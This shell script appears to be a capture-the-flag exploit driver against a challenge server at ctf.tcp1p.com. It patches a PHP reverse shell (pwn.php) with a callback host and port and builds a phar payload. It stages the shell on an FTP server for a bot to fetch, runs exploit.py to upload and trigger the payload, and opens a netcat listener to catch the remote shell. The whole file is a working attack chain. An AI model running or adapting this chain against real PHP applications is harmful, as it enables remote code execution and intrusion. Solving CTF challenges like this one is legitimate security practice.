#!/bin/sh

DOMAIN="ctf.tcp1p.com"
LPORT=4444
TARGET="http://ctf.tcp1p.com:29458/"
FTP_PORT=2000
fpt="ftp://ctf.tcp1p.com:$FTP_PORT"

# change the ip and port of pwn.php to desired value
sed -i "s/\$ip = '.*';/\$ip = '$DOMAIN';/" pwn.php
sed -i "s/\$port = .*;/\$port = $LPORT;/" pwn.php

# make phar file
php --define phar.readonly=0 payload.php

# start ftp server for the bot to get the pwn.php file
python3 ftp.py $FTP_PORT &

# upload the phar and trigger it
URL="$TARGET" \
NGROK="$fpt" \
python3 exploit.py &

# listen for the flag
nc -lvnp $LPORT

pkill -f "python3 ftp.py"
